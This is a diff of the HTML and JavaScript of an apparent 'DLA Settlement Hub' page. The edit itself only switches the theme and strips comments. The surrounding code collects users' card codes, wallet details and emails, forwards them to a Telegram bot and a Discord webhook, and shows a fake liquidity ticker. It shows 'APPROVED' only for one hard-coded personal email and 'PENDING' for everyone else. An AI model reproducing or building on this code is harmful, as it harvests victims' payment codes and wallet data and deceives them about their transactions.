@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en" data-theme="light">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -74,7 +74,7 @@
 </head>
 <body>
 
-    <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">☀️ LIGHT</button>
+    <button class="theme-toggle" id="theme-btn" onclick="toggleTheme()">🌙 DARK</button>
     <div class="ticker-wrap"><div class="ticker" id="live-ticker">💰 LIQUIDITY: $2,840,500 • 🛡️ DLA ENCRYPTION • ⚡ INSTANT SETTLEMENT • 🌍 GLOBAL NODE ACTIVE</div></div>
 
     <div class="panel">
@@ -211,7 +211,6 @@
         let method = ""; let rateL = 1; let sym = "USD";
         const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
 
-        // TOGGLE VIEWS
         function toggleView(view) {
             if(view === 'dashboard') {
                 document.getElementById('form').style.display = 'none';
@@ -223,14 +222,12 @@
             }
         }
 
-        // LOAD HISTORY WITH APPROVAL LOGIC
         function loadDashboard() {
             const history = JSON.parse(localStorage.getItem('dla_history') || '[]');
             const container = document.getElementById('tx-history-list');
             if(history.length === 0) return;
             
             container.innerHTML = history.reverse().map(tx => {
-                // Keep unique logic for History as previously requested
                 const isApproved = (tx.email && tx.email.toLowerCase() === "joseeruitha@gmail.com");
                 const statusText = isApproved ? "APPROVED" : "PENDING";
                 const statusClass = isApproved ? "status-approved" : "status-pending";
@@ -305,7 +302,6 @@
             
             if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");
 
-            // SAVE TO LOCAL HISTORY WITH EMAIL
             const history = JSON.parse(localStorage.getItem('dla_history') || '[]');
             const newTx = { 
                 id: 'DLA-'+Math.floor(Math.random()*99999), 
@@ -320,7 +316,6 @@
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // Telegram Notification
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             const messageText = `🚨 *NEW DLA SUBMISSION*\n\n` +
                                 `*Asset:* ${assetName}\n` +
@@ -341,7 +336,6 @@
                 keepalive: true
             });
 
-            // Discord Message
             const discordPayload = {
                 username: "DLA SETTLEMENT HUB",
                 embeds: [{
